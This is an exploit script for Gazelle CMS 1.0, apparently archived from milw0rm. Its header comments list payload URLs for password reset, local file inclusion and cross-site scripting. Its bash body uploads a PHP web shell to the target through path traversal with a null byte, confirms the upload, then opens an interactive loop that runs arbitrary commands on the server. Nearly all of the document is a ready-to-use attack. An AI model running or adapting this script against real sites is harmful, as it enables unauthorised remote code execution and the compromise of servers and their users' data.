#!/bin/bash
#       Gazelle CMS 1.0 Multiple Vulnerabilities
#       Script Download: http://www.anantasoft.com/index.php?Gazelle%20CMS/Download
#       Found by white_sheep on 11/08/2009
#       Contact: sheewhite@googlemail.com - https://www.ihteam.net
#       Need magic_quote_gpc Off for RCE and LFI
#       Thanks to R00T[ATI]
#
#               PASSWORD RESET:
# http://localhost/gazelle/renew.php?user=[username]
#
#               LFI:
# author: fuzion (milw0rm.com/author/1343)
# http://localhost/gazelle/index.php?template=[LFI]
#
#               XSS:
# http://localhost/gazelle/user.php?user=</title>[XSS]
# http://localhost/gazelle/search.php?lookup=<script+type="text/javascript">[CODE]</script>
#
#               RCE:
echo
echo "###############################################"
echo "#             GazelleCMS 1.0 RCE              #"
echo "#  by white_sheep				    #"
echo "#  sheewhite[at]googlemail[dot]com            #"
echo "#						    #"
echo "#           https://www.ihteam.net            #"
echo "###############################################"
echo


EVILC='<?php passthru($_GET[cmd]); ?>'

echo -n "Insert url with path (ex.: http://localhost/gazelle): " 
read SITE

PAGENAME=/modules/menu$RANDOM'.bak.php'

curl -F "siteTitle='INIT'$EVILC'EOF';type=text/html" $SITE'/admin/settemplate.php?customizetemplate=..'$PAGENAME'%00' 1>/dev/null 2>/dev/null

if [ "`curl -s $SITE''$PAGENAME | grep siteTitle`" == "" ]
then 
	echo "[-] Not Vulnerable :( byee"
	exit
fi

while true
do
	echo -n "sh$: "
	read -r CMD
	CMD=`echo $CMD | sed 's/ /+/g'`
	echo $CMD
	curl -s "$SITE$PAGENAME?cmd=$CMD" | sed "s/.*'INIT'//g;s/'EOF'.*//g"
	echo
done

# milw0rm.com [2009-08-12]
